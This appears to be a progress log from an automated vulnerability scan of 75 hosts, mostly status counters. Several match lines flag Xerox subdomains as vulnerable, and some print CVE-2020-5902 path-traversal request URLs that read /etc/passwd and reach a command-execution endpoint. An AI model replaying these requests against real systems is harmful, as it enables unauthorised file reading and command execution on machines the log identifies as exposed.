[+] Started: Sun Aug 16 07:26:41 UTC 2026
[+] Run ID: 31830712914
[+] Batch: batch-0062
[+] URL count: 75
[0:00:05] | Templates: 6831 | Hosts: 75 | RPS: 54 | Matched: 0 | Errors: 0 | Requests: 284/1135575 (0%)
[0:17:10] | Templates: 6831 | Hosts: 75 | RPS: 87 | Matched: 0 | Errors: 1249 | Requests: 89632/1135575 (7%)
[0:17:15] | Templates: 6831 | Hosts: 75 | RPS: 86 | Matched: 0 | Errors: 1253 | Requests: 89900/1135575 (7%)
[0:17:20] | Templates: 6831 | Hosts: 75 | RPS: 86 | Matched: 0 | Errors: 1255 | Requests: 90192/1135575 (7%)
[0:17:25] | Templates: 6831 | Hosts: 75 | RPS: 86 | Matched: 0 | Errors: 1257 | Requests: 90538/1135575 (7%)
[0:17:30] | Templates: 6831 | Hosts: 75 | RPS: 86 | Matched: 0 | Errors: 1264 | Requests: 90877/1135575 (8%)
[0:17:35] | Templates: 6831 | Hosts: 75 | RPS: 86 | Matched: 0 | Errors: 1264 | Requests: 91222/1135575 (8%)
[0:17:40] | Templates: 6831 | Hosts: 75 | RPS: 86 | Matched: 0 | Errors: 1268 | Requests: 92136/1135575 (8%)
[0:17:45] | Templates: 6831 | Hosts: 75 | RPS: 86 | Matched: 0 | Errors: 1276 | Requests: 92288/1135575 (8%)
[0:17:50] | Templates: 6831 | Hosts: 75 | RPS: 86 | Matched: 0 | Errors: 1282 | Requests: 92371/1135575 (8%)
[0:17:55] | Templates: 6831 | Hosts: 75 | RPS: 86 | Matched: 0 | Errors: 1302 | Requests: 92594/1135575 (8%)
[0:18:00] | Templates: 6831 | Hosts: 75 | RPS: 86 | Matched: 0 | Errors: 1306 | Requests: 92940/1135575 (8%)
[0:18:05] | Templates: 6831 | Hosts: 75 | RPS: 85 | Matched: 0 | Errors: 1314 | Requests: 93300/1135575 (8%)
[0:18:10] | Templates: 6831 | Hosts: 75 | RPS: 86 | Matched: 0 | Errors: 1318 | Requests: 94183/1135575 (8%)
[0:18:15] | Templates: 6831 | Hosts: 75 | RPS: 86 | Matched: 0 | Errors: 1322 | Requests: 94271/1135575 (8%)
[0:18:20] | Templates: 6831 | Hosts: 75 | RPS: 85 | Matched: 0 | Errors: 1323 | Requests: 94304/1135575 (8%)
[0:18:25] | Templates: 6831 | Hosts: 75 | RPS: 85 | Matched: 0 | Errors: 1331 | Requests: 94526/1135575 (8%)
[0:18:30] | Templates: 6831 | Hosts: 75 | RPS: 85 | Matched: 0 | Errors: 1336 | Requests: 94850/1135575 (8%)
[0:18:35] | Templates: 6831 | Hosts: 75 | RPS: 85 | Matched: 0 | Errors: 1338 | Requests: 95141/1135575 (8%)
[0:18:40] | Templates: 6831 | Hosts: 75 | RPS: 85 | Matched: 0 | Errors: 1351 | Requests: 96004/1135575 (8%)
[0:18:45] | Templates: 6831 | Hosts: 75 | RPS: 85 | Matched: 0 | Errors: 1351 | Requests: 96137/1135575 (8%)
[0:18:50] | Templates: 6831 | Hosts: 75 | RPS: 85 | Matched: 0 | Errors: 1351 | Requests: 96188/1135575 (8%)
[0:18:55] | Templates: 6831 | Hosts: 75 | RPS: 84 | Matched: 0 | Errors: 1359 | Requests: 96421/1135575 (8%)
[0:19:00] | Templates: 6831 | Hosts: 75 | RPS: 84 | Matched: 0 | Errors: 1361 | Requests: 96821/1135575 (8%)
[0:19:05] | Templates: 6831 | Hosts: 75 | RPS: 84 | Matched: 0 | Errors: 1365 | Requests: 97291/1135575 (8%)
[0:19:10] | Templates: 6831 | Hosts: 75 | RPS: 85 | Matched: 0 | Errors: 1367 | Requests: 97958/1135575 (8%)
[0:19:15] | Templates: 6831 | Hosts: 75 | RPS: 84 | Matched: 0 | Errors: 1369 | Requests: 98072/1135575 (8%)
[0:19:20] | Templates: 6831 | Hosts: 75 | RPS: 84 | Matched: 0 | Errors: 1371 | Requests: 98162/1135575 (8%)
[0:19:25] | Templates: 6831 | Hosts: 75 | RPS: 84 | Matched: 0 | Errors: 1378 | Requests: 98463/1135575 (8%)
[0:19:30] | Templates: 6831 | Hosts: 75 | RPS: 84 | Matched: 0 | Errors: 1382 | Requests: 98761/1135575 (8%)
[0:19:35] | Templates: 6831 | Hosts: 75 | RPS: 84 | Matched: 0 | Errors: 1388 | Requests: 99357/1135575 (8%)
[0:19:40] | Templates: 6831 | Hosts: 75 | RPS: 84 | Matched: 0 | Errors: 1396 | Requests: 99683/1135575 (8%)
[0:19:45] | Templates: 6831 | Hosts: 75 | RPS: 84 | Matched: 0 | Errors: 1400 | Requests: 99730/1135575 (8%)
[0:19:50] | Templates: 6831 | Hosts: 75 | RPS: 83 | Matched: 0 | Errors: 1402 | Requests: 99838/1135575 (8%)
[0:19:55] | Templates: 6831 | Hosts: 75 | RPS: 83 | Matched: 0 | Errors: 1404 | Requests: 100126/1135575 (8%)
[0:20:00] | Templates: 6831 | Hosts: 75 | RPS: 83 | Matched: 0 | Errors: 1406 | Requests: 100396/1135575 (8%)
[0:20:05] | Templates: 6831 | Hosts: 75 | RPS: 83 | Matched: 0 | Errors: 1406 | Requests: 101123/1135575 (8%)
[0:20:10] | Templates: 6831 | Hosts: 75 | RPS: 83 | Matched: 0 | Errors: 1416 | Requests: 101329/1135575 (8%)
[0:20:15] | Templates: 6831 | Hosts: 75 | RPS: 83 | Matched: 0 | Errors: 1416 | Requests: 101410/1135575 (8%)
[0:20:20] | Templates: 6831 | Hosts: 75 | RPS: 83 | Matched: 0 | Errors: 1418 | Requests: 101589/1135575 (8%)
[0:20:25] | Templates: 6831 | Hosts: 75 | RPS: 83 | Matched: 0 | Errors: 1422 | Requests: 101891/1135575 (8%)
[0:20:30] | Templates: 6831 | Hosts: 75 | RPS: 83 | Matched: 0 | Errors: 1430 | Requests: 102381/1135575 (9%)
[0:20:35] | Templates: 6831 | Hosts: 75 | RPS: 83 | Matched: 0 | Errors: 1448 | Requests: 102827/1135575 (9%)
[0:20:40] | Templates: 6831 | Hosts: 75 | RPS: 83 | Matched: 0 | Errors: 1450 | Requests: 103065/1135575 (9%)
[0:20:45] | Templates: 6831 | Hosts: 75 | RPS: 82 | Matched: 0 | Errors: 1452 | Requests: 103279/1135575 (9%)
[0:20:50] | Templates: 6831 | Hosts: 75 | RPS: 82 | Matched: 0 | Errors: 1452 | Requests: 103477/1135575 (9%)
[0:20:55] | Templates: 6831 | Hosts: 75 | RPS: 82 | Matched: 0 | Errors: 1454 | Requests: 103819/1135575 (9%)
[0:21:00] | Templates: 6831 | Hosts: 75 | RPS: 82 | Matched: 0 | Errors: 1466 | Requests: 104386/1135575 (9%)
[0:21:05] | Templates: 6831 | Hosts: 75 | RPS: 82 | Matched: 0 | Errors: 1472 | Requests: 104471/1135575 (9%)
[0:21:10] | Templates: 6831 | Hosts: 75 | RPS: 82 | Matched: 0 | Errors: 1474 | Requests: 104834/1135575 (9%)
[0:21:15] | Templates: 6831 | Hosts: 75 | RPS: 82 | Matched: 0 | Errors: 1480 | Requests: 105131/1135575 (9%)
[0:21:20] | Templates: 6831 | Hosts: 75 | RPS: 82 | Matched: 0 | Errors: 1482 | Requests: 105422/1135575 (9%)
[0:21:25] | Templates: 6831 | Hosts: 75 | RPS: 82 | Matched: 0 | Errors: 1488 | Requests: 105706/1135575 (9%)
[0:21:30] | Templates: 6831 | Hosts: 75 | RPS: 82 | Matched: 0 | Errors: 1498 | Requests: 106014/1135575 (9%)
[0:21:35] | Templates: 6831 | Hosts: 75 | RPS: 82 | Matched: 0 | Errors: 1504 | Requests: 106279/1135575 (9%)
[0:21:40] | Templates: 6831 | Hosts: 75 | RPS: 81 | Matched: 0 | Errors: 1516 | Requests: 106590/1135575 (9%)
[0:21:45] | Templates: 6831 | Hosts: 75 | RPS: 81 | Matched: 0 | Errors: 1522 | Requests: 106917/1135575 (9%)
[0:21:50] | Templates: 6831 | Hosts: 75 | RPS: 81 | Matched: 0 | Errors: 1530 | Requests: 107341/1135575 (9%)
[0:21:55] | Templates: 6831 | Hosts: 75 | RPS: 81 | Matched: 0 | Errors: 1534 | Requests: 107737/1135575 (9%)
[0:22:00] | Templates: 6831 | Hosts: 75 | RPS: 81 | Matched: 0 | Errors: 1536 | Requests: 108140/1135575 (9%)
[0:22:05] | Templates: 6831 | Hosts: 75 | RPS: 81 | Matched: 0 | Errors: 1546 | Requests: 108581/1135575 (9%)
[0:22:10] | Templates: 6831 | Hosts: 75 | RPS: 81 | Matched: 0 | Errors: 1554 | Requests: 108994/1135575 (9%)
[[92mCVE-2020-3952[0m:[1;92mversion[0m] [[94mhttp[0m] [[31mcritical[0m] https://vlpconproxy-msp.support.xerox.com/sdk/ [[96m"4.0.0"[0m]
[0:22:15] | Templates: 6831 | Hosts: 75 | RPS: 81 | Matched: 1 | Errors: 1562 | Requests: 109364/1135575 (9%)
[0:22:20] | Templates: 6831 | Hosts: 75 | RPS: 81 | Matched: 1 | Errors: 1568 | Requests: 109759/1135575 (9%)
[0:22:25] | Templates: 6831 | Hosts: 75 | RPS: 81 | Matched: 1 | Errors: 1572 | Requests: 110104/1135575 (9%)
[0:22:30] | Templates: 6831 | Hosts: 75 | RPS: 81 | Matched: 1 | Errors: 1574 | Requests: 110432/1135575 (9%)
[0:22:35] | Templates: 6831 | Hosts: 75 | RPS: 81 | Matched: 1 | Errors: 1578 | Requests: 110854/1135575 (9%)
[0:22:40] | Templates: 6831 | Hosts: 75 | RPS: 81 | Matched: 1 | Errors: 1582 | Requests: 111121/1135575 (9%)
[0:22:45] | Templates: 6831 | Hosts: 75 | RPS: 81 | Matched: 1 | Errors: 1590 | Requests: 111384/1135575 (9%)
[0:22:50] | Templates: 6831 | Hosts: 75 | RPS: 81 | Matched: 1 | Errors: 1594 | Requests: 111665/1135575 (9%)
[0:22:55] | Templates: 6831 | Hosts: 75 | RPS: 81 | Matched: 1 | Errors: 1602 | Requests: 111964/1135575 (9%)
[0:23:00] | Templates: 6831 | Hosts: 75 | RPS: 81 | Matched: 1 | Errors: 1604 | Requests: 112272/1135575 (9%)
[0:23:05] | Templates: 6831 | Hosts: 75 | RPS: 81 | Matched: 1 | Errors: 1610 | Requests: 112592/1135575 (9%)
[0:23:10] | Templates: 6831 | Hosts: 75 | RPS: 81 | Matched: 1 | Errors: 1612 | Requests: 112865/1135575 (9%)
[0:23:15] | Templates: 6831 | Hosts: 75 | RPS: 81 | Matched: 1 | Errors: 1616 | Requests: 113149/1135575 (9%)
[0:23:20] | Templates: 6831 | Hosts: 75 | RPS: 81 | Matched: 1 | Errors: 1620 | Requests: 113435/1135575 (9%)
[0:23:25] | Templates: 6831 | Hosts: 75 | RPS: 80 | Matched: 1 | Errors: 1626 | Requests: 113730/1135575 (10%)
[0:23:30] | Templates: 6831 | Hosts: 75 | RPS: 80 | Matched: 1 | Errors: 1632 | Requests: 114008/1135575 (10%)
[0:23:35] | Templates: 6831 | Hosts: 75 | RPS: 80 | Matched: 1 | Errors: 1640 | Requests: 114358/1135575 (10%)
[0:23:40] | Templates: 6831 | Hosts: 75 | RPS: 80 | Matched: 1 | Errors: 1648 | Requests: 114625/1135575 (10%)
[0:23:45] | Templates: 6831 | Hosts: 75 | RPS: 80 | Matched: 1 | Errors: 1659 | Requests: 114916/1135575 (10%)
[0:23:50] | Templates: 6831 | Hosts: 75 | RPS: 80 | Matched: 1 | Errors: 1669 | Requests: 115176/1135575 (10%)
[0:23:55] | Templates: 6831 | Hosts: 75 | RPS: 80 | Matched: 1 | Errors: 1675 | Requests: 115427/1135575 (10%)
[0:24:00] | Templates: 6831 | Hosts: 75 | RPS: 80 | Matched: 1 | Errors: 1689 | Requests: 115681/1135575 (10%)
[0:24:05] | Templates: 6831 | Hosts: 75 | RPS: 80 | Matched: 1 | Errors: 1699 | Requests: 115931/1135575 (10%)
[0:24:10] | Templates: 6831 | Hosts: 75 | RPS: 80 | Matched: 1 | Errors: 1707 | Requests: 116181/1135575 (10%)
[[92mCVE-2020-5902[0m] [[94mhttp[0m] [[31mcritical[0m] https://vcm08.external.xerox.com/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd
[0:24:15] | Templates: 6831 | Hosts: 75 | RPS: 80 | Matched: 2 | Errors: 1713 | Requests: 116455/1135575 (10%)
[[92mCVE-2020-5902[0m] [[94mhttp[0m] [[31mcritical[0m] https://vcm08.external.xerox.com/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/f5-release
[0:24:20] | Templates: 6831 | Hosts: 75 | RPS: 79 | Matched: 3 | Errors: 1717 | Requests: 116713/1135575 (10%)
[0:24:25] | Templates: 6831 | Hosts: 75 | RPS: 79 | Matched: 3 | Errors: 1725 | Requests: 116993/1135575 (10%)
[0:24:30] | Templates: 6831 | Hosts: 75 | RPS: 79 | Matched: 3 | Errors: 1731 | Requests: 117328/1135575 (10%)
[[92mCVE-2020-5902[0m] [[94mhttp[0m] [[31mcritical[0m] https://vcm08.external.xerox.com/tmui/locallb/workspace/tmshCmd.jsp
[0:24:35] | Templates: 6831 | Hosts: 75 | RPS: 79 | Matched: 4 | Errors: 1731 | Requests: 117631/1135575 (10%)
[[92mCVE-2020-5902[0m] [[94mhttp[0m] [[31mcritical[0m] https://vcm08.external.xerox.com/tmui/locallb/workspace/tmshCmd.jsp
[0:24:40] | Templates: 6831 | Hosts: 75 | RPS: 79 | Matched: 5 | Errors: 1739 | Requests: 117996/1135575 (10%)
[[92mCVE-2020-5902[0m] [[94mhttp[0m] [[31mcritical[0m] https://vcm08.external.xerox.com/tmui/locallb/workspace/tmshCmd.jsp
[0:24:45] | Templates: 6831 | Hosts: 75 | RPS: 79 | Matched: 6 | Errors: 1745 | Requests: 118421/1135575 (10%)
[0:24:50] | Templates: 6831 | Hosts: 75 | RPS: 79 | Matched: 6 | Errors: 1751 | Requests: 118943/1135575 (10%)
[0:24:55] | Templates: 6831 | Hosts: 75 | RPS: 79 | Matched: 6 | Errors: 1757 | Requests: 119254/1135575 (10%)
[0:25:00] | Templates: 6831 | Hosts: 75 | RPS: 79 | Matched: 6 | Errors: 1761 | Requests: 119614/1135575 (10%)
[0:25:05] | Templates: 6831 | Hosts: 75 | RPS: 79 | Matched: 6 | Errors: 1761 | Requests: 119933/1135575 (10%)
[0:25:10] | Templates: 6831 | Hosts: 75 | RPS: 79 | Matched: 6 | Errors: 1765 | Requests: 120263/1135575 (10%)
[0:25:15] | Templates: 6831 | Hosts: 75 | RPS: 79 | Matched: 6 | Errors: 1767 | Requests: 120587/1135575 (10%)
[0:25:20] | Templates: 6831 | Hosts: 75 | RPS: 79 | Matched: 6 | Errors: 1771 | Requests: 120909/1135575 (10%)
[0:25:25] | Templates: 6831 | Hosts: 75 | RPS: 79 | Matched: 6 | Errors: 1773 | Requests: 121220/1135575 (10%)
[0:25:30] | Templates: 6831 | Hosts: 75 | RPS: 79 | Matched: 6 | Errors: 1779 | Requests: 121448/1135575 (10%)
[0:25:35] | Templates: 6831 | Hosts: 75 | RPS: 79 | Matched: 6 | Errors: 1795 | Requests: 121827/1135575 (10%)
[0:25:40] | Templates: 6831 | Hosts: 75 | RPS: 79 | Matched: 6 | Errors: 1801 | Requests: 122190/1135575 (10%)
[0:25:45] | Templates: 6831 | Hosts: 75 | RPS: 79 | Matched: 6 | Errors: 1807 | Requests: 122622/1135575 (10%)
[0:25:50] | Templates: 6831 | Hosts: 75 | RPS: 79 | Matched: 6 | Errors: 1811 | Requests: 123028/1135575 (10%)
[0:25:55] | Templates: 6831 | Hosts: 75 | RPS: 79 | Matched: 6 | Errors: 1817 | Requests: 123441/1135575 (10%)
[0:26:00] | Templates: 6831 | Hosts: 75 | RPS: 79 | Matched: 6 | Errors: 1823 | Requests: 123839/1135575 (10%)
[0:26:05] | Templates: 6831 | Hosts: 75 | RPS: 79 | Matched: 6 | Errors: 1829 | Requests: 124244/1135575 (10%)
[0:26:10] | Templates: 6831 | Hosts: 75 | RPS: 79 | Matched: 6 | Errors: 1835 | Requests: 124702/1135575 (10%)
[0:26:15] | Templates: 6831 | Hosts: 75 | RPS: 79 | Matched: 6 | Errors: 1837 | Requests: 125165/1135575 (11%)
[0:26:20] | Templates: 6831 | Hosts: 75 | RPS: 79 | Matched: 6 | Errors: 1841 | Requests: 125624/1135575 (11%)
[0:26:25] | Templates: 6831 | Hosts: 75 | RPS: 79 | Matched: 6 | Errors: 1847 | Requests: 126083/1135575 (11%)
[0:26:30] | Templates: 6831 | Hosts: 75 | RPS: 79 | Matched: 6 | Errors: 1847 | Requests: 126552/1135575 (11%)
[0:26:35] | Templates: 6831 | Hosts: 75 | RPS: 79 | Matched: 6 | Errors: 1853 | Requests: 126973/1135575 (11%)
[0:26:40] | Templates: 6831 | Hosts: 75 | RPS: 79 | Matched: 6 | Errors: 1855 | Requests: 127408/1135575 (11%)
[0:26:45] | Templates: 6831 | Hosts: 75 | RPS: 79 | Matched: 6 | Errors: 1859 | Requests: 127831/1135575 (11%)
[0:26:50] | Templates: 6831 | Hosts: 75 | RPS: 79 | Matched: 6 | Errors: 1859 | Requests: 128241/1135575 (11%)
[0:26:55] | Templates: 6831 | Hosts: 75 | RPS: 79 | Matched: 6 | Errors: 1871 | Requests: 128664/1135575 (11%)
[0:27:00] | Templates: 6831 | Hosts: 75 | RPS: 79 | Matched: 6 | Errors: 1887 | Requests: 129075/1135575 (11%)
[0:27:05] | Templates: 6831 | Hosts: 75 | RPS: 79 | Matched: 6 | Errors: 1897 | Requests: 129522/1135575 (11%)
[0:27:10] | Templates: 6831 | Hosts: 75 | RPS: 79 | Matched: 6 | Errors: 1907 | Requests: 129987/1135575 (11%)
[0:27:15] | Templates: 6831 | Hosts: 75 | RPS: 79 | Matched: 6 | Errors: 1913 | Requests: 130534/1135575 (11%)
[0:27:20] | Templates: 6831 | Hosts: 75 | RPS: 79 | Matched: 6 | Errors: 1925 | Requests: 131003/1135575 (11%)
[0:27:25] | Templates: 6831 | Hosts: 75 | RPS: 79 | Matched: 6 | Errors: 1935 | Requests: 131463/1135575 (11%)
[0:27:30] | Templates: 6831 | Hosts: 75 | RPS: 79 | Matched: 6 | Errors: 1940 | Requests: 131914/1135575 (11%)
[0:27:35] | Templates: 6831 | Hosts: 75 | RPS: 80 | Matched: 6 | Errors: 1949 | Requests: 132454/1135575 (11%)
[0:27:40] | Templates: 6831 | Hosts: 75 | RPS: 79 | Matched: 6 | Errors: 1957 | Requests: 132747/1135575 (11%)
[0:27:45] | Templates: 6831 | Hosts: 75 | RPS: 79 | Matched: 6 | Errors: 1962 | Requests: 133024/1135575 (11%)
[0:27:50] | Templates: 6831 | Hosts: 75 | RPS: 79 | Matched: 6 | Errors: 1966 | Requests: 133351/1135575 (11%)
[0:27:55] | Templates: 6831 | Hosts: 75 | RPS: 79 | Matched: 6 | Errors: 1968 | Requests: 133633/1135575 (11%)
[0:28:00] | Templates: 6831 | Hosts: 75 | RPS: 79 | Matched: 6 | Errors: 1970 | Requests: 133925/1135575 (11%)
[0:28:05] | Templates: 6831 | Hosts: 75 | RPS: 79 | Matched: 6 | Errors: 1972 | Requests: 134211/1135575 (11%)
[0:28:10] | Templates: 6831 | Hosts: 75 | RPS: 79 | Matched: 6 | Errors: 1972 | Requests: 134466/1135575 (11%)
[0:28:15] | Templates: 6831 | Hosts: 75 | RPS: 79 | Matched: 6 | Errors: 1976 | Requests: 134684/1135575 (11%)
[0:28:20] | Templates: 6831 | Hosts: 75 | RPS: 79 | Matched: 6 | Errors: 1989 | Requests: 134947/1135575 (11%)
[0:28:25] | Templates: 6831 | Hosts: 75 | RPS: 79 | Matched: 6 | Errors: 2001 | Requests: 135293/1135575 (11%)
[0:28:30] | Templates: 6831 | Hosts: 75 | RPS: 79 | Matched: 6 | Errors: 2011 | Requests: 135624/1135575 (11%)
[0:28:35] | Templates: 6831 | Hosts: 75 | RPS: 79 | Matched: 6 | Errors: 2021 | Requests: 135936/1135575 (11%)
[0:28:40] | Templates: 6831 | Hosts: 75 | RPS: 79 | Matched: 6 | Errors: 2029 | Requests: 136320/1135575 (12%)
[0:28:45] | Templates: 6831 | Hosts: 75 | RPS: 79 | Matched: 6 | Errors: 2029 | Requests: 136639/1135575 (12%)
[0:28:50] | Templates: 6831 | Hosts: 75 | RPS: 79 | Matched: 6 | Errors: 2033 | Requests: 136994/1135575 (12%)
[0:28:55] | Templates: 6831 | Hosts: 75 | RPS: 79 | Matched: 6 | Errors: 2037 | Requests: 137325/1135575 (12%)
[0:29:00] | Templates: 6831 | Hosts: 75 | RPS: 79 | Matched: 6 | Errors: 2043 | Requests: 137652/1135575 (12%)
[0:29:05] | Templates: 6831 | Hosts: 75 | RPS: 79 | Matched: 6 | Errors: 2047 | Requests: 137994/1135575 (12%)
[0:29:10] | Templates: 6831 | Hosts: 75 | RPS: 79 | Matched: 6 | Errors: 2051 | Requests: 138307/1135575 (12%)
[0:29:15] | Templates: 6831 | Hosts: 75 | RPS: 78 | Matched: 6 | Errors: 2055 | Requests: 138620/1135575 (12%)
[0:29:20] | Templates: 6831 | Hosts: 75 | RPS: 78 | Matched: 6 | Errors: 2063 | Requests: 138953/1135575 (12%)
[0:29:25] | Templates: 6831 | Hosts: 75 | RPS: 78 | Matched: 6 | Errors: 2065 | Requests: 139243/1135575 (12%)
[0:29:30] | Templates: 6831 | Hosts: 75 | RPS: 78 | Matched: 6 | Errors: 2081 | Requests: 139619/1135575 (12%)
[0:29:35] | Templates: 6831 | Hosts: 75 | RPS: 78 | Matched: 6 | Errors: 2087 | Requests: 139966/1135575 (12%)
[0:29:40] | Templates: 6831 | Hosts: 75 | RPS: 78 | Matched: 6 | Errors: 2091 | Requests: 140342/1135575 (12%)
[0:29:45] | Templates: 6831 | Hosts: 75 | RPS: 78 | Matched: 6 | Errors: 2099 | Requests: 140727/1135575 (12%)
[0:29:50] | Templates: 6831 | Hosts: 75 | RPS: 78 | Matched: 6 | Errors: 2101 | Requests: 141125/1135575 (12%)
[0:29:55] | Templates: 6831 | Hosts: 75 | RPS: 78 | Matched: 6 | Errors: 2105 | Requests: 141480/1135575 (12%)
[0:30:00] | Templates: 6831 | Hosts: 75 | RPS: 78 | Matched: 6 | Errors: 2115 | Requests: 141840/1135575 (12%)
[0:30:05] | Templates: 6831 | Hosts: 75 | RPS: 78 | Matched: 6 | Errors: 2119 | Requests: 142135/1135575 (12%)
[0:30:10] | Templates: 6831 | Hosts: 75 | RPS: 78 | Matched: 6 | Errors: 2121 | Requests: 142418/1135575 (12%)
[0:30:15] | Templates: 6831 | Hosts: 75 | RPS: 78 | Matched: 6 | Errors: 2123 | Requests: 142701/1135575 (12%)
[0:30:20] | Templates: 6831 | Hosts: 75 | RPS: 78 | Matched: 6 | Errors: 2125 | Requests: 143000/1135575 (12%)
[0:30:25] | Templates: 6831 | Hosts: 75 | RPS: 78 | Matched: 6 | Errors: 2129 | Requests: 143314/1135575 (12%)
[0:30:30] | Templates: 6831 | Hosts: 75 | RPS: 78 | Matched: 6 | Errors: 2135 | Requests: 143608/1135575 (12%)
[0:30:35] | Templates: 6831 | Hosts: 75 | RPS: 78 | Matched: 6 | Errors: 2141 | Requests: 143955/1135575 (12%)
[0:30:40] | Templates: 6831 | Hosts: 75 | RPS: 78 | Matched: 6 | Errors: 2145 | Requests: 144253/1135575 (12%)
[0:30:45] | Templates: 6831 | Hosts: 75 | RPS: 78 | Matched: 6 | Errors: 2155 | Requests: 144526/1135575 (12%)
[0:30:50] | Templates: 6831 | Hosts: 75 | RPS: 78 | Matched: 6 | Errors: 2159 | Requests: 144817/1135575 (12%)
[0:30:55] | Templates: 6831 | Hosts: 75 | RPS: 78 | Matched: 6 | Errors: 2171 | Requests: 145080/1135575 (12%)
[0:31:00] | Templates: 6831 | Hosts: 75 | RPS: 78 | Matched: 6 | Errors: 2183 | Requests: 145355/1135575 (12%)
[0:31:05] | Templates: 6831 | Hosts: 75 | RPS: 78 | Matched: 6 | Errors: 2189 | Requests: 145656/1135575 (12%)
[0:31:10] | Templates: 6831 | Hosts: 75 | RPS: 78 | Matched: 6 | Errors: 2193 | Requests: 145995/1135575 (12%)
[0:31:15] | Templates: 6831 | Hosts: 75 | RPS: 78 | Matched: 6 | Errors: 2199 | Requests: 146314/1135575 (12%)
[0:31:20] | Templates: 6831 | Hosts: 75 | RPS: 78 | Matched: 6 | Errors: 2203 | Requests: 146674/1135575 (12%)
[0:31:25] | Templates: 6831 | Hosts: 75 | RPS: 78 | Matched: 6 | Errors: 2211 | Requests: 147051/1135575 (12%)
[0:31:30] | Templates: 6831 | Hosts: 75 | RPS: 77 | Matched: 6 | Errors: 2223 | Requests: 147383/1135575 (12%)
[0:31:35] | Templates: 6831 | Hosts: 75 | RPS: 77 | Matched: 6 | Errors: 2229 | Requests: 147750/1135575 (13%)
[0:31:40] | Templates: 6831 | Hosts: 75 | RPS: 77 | Matched: 6 | Errors: 2235 | Requests: 148044/1135575 (13%)
[0:31:45] | Templates: 6831 | Hosts: 75 | RPS: 77 | Matched: 6 | Errors: 2243 | Requests: 148332/1135575 (13%)
[0:31:50] | Templates: 6831 | Hosts: 75 | RPS: 77 | Matched: 6 | Errors: 2245 | Requests: 148610/1135575 (13%)
[0:31:55] | Templates: 6831 | Hosts: 75 | RPS: 77 | Matched: 6 | Errors: 2253 | Requests: 148927/1135575 (13%)
[0:32:00] | Templates: 6831 | Hosts: 75 | RPS: 77 | Matched: 6 | Errors: 2261 | Requests: 149256/1135575 (13%)
[0:32:05] | Templates: 6831 | Hosts: 75 | RPS: 77 | Matched: 6 | Errors: 2267 | Requests: 149584/1135575 (13%)
[0:32:10] | Templates: 6831 | Hosts: 75 | RPS: 77 | Matched: 6 | Errors: 2273 | Requests: 149906/1135575 (13%)
[0:32:15] | Templates: 6831 | Hosts: 75 | RPS: 77 | Matched: 6 | Errors: 2279 | Requests: 150278/1135575 (13%)
[0:32:20] | Templates: 6831 | Hosts: 75 | RPS: 77 | Matched: 6 | Errors: 2279 | Requests: 150603/1135575 (13%)
[0:32:25] | Templates: 6831 | Hosts: 75 | RPS: 77 | Matched: 6 | Errors: 2283 | Requests: 150957/1135575 (13%)
[0:32:30] | Templates: 6831 | Hosts: 75 | RPS: 77 | Matched: 6 | Errors: 2289 | Requests: 151276/1135575 (13%)
[0:32:35] | Templates: 6831 | Hosts: 75 | RPS: 77 | Matched: 6 | Errors: 2293 | Requests: 151681/1135575 (13%)
[0:32:40] | Templates: 6831 | Hosts: 75 | RPS: 77 | Matched: 6 | Errors: 2295 | Requests: 152018/1135575 (13%)
[0:32:45] | Templates: 6831 | Hosts: 75 | RPS: 77 | Matched: 6 | Errors: 2301 | Requests: 152340/1135575 (13%)
[0:32:50] | Templates: 6831 | Hosts: 75 | RPS: 77 | Matched: 6 | Errors: 2303 | Requests: 152672/1135575 (13%)
[0:32:55] | Templates: 6831 | Hosts: 75 | RPS: 77 | Matched: 6 | Errors: 2307 | Requests: 152970/1135575 (13%)
[0:33:00] | Templates: 6831 | Hosts: 75 | RPS: 77 | Matched: 6 | Errors: 2309 | Requests: 153303/1135575 (13%)
[0:33:05] | Templates: 6831 | Hosts: 75 | RPS: 77 | Matched: 6 | Errors: 2311 | Requests: 153617/1135575 (13%)
[0:33:10] | Templates: 6831 | Hosts: 75 | RPS: 77 | Matched: 6 | Errors: 2315 | Requests: 153906/1135575 (13%)
[0:33:15] | Templates: 6831 | Hosts: 75 | RPS: 77 | Matched: 6 | Errors: 2317 | Requests: 154206/1135575 (13%)
[0:33:20] | Templates: 6831 | Hosts: 75 | RPS: 77 | Matched: 6 | Errors: 2327 | Requests: 154506/1135575 (13%)
[0:33:25] | Templates: 6831 | Hosts: 75 | RPS: 77 | Matched: 6 | Errors: 2335 | Requests: 154795/1135575 (13%)
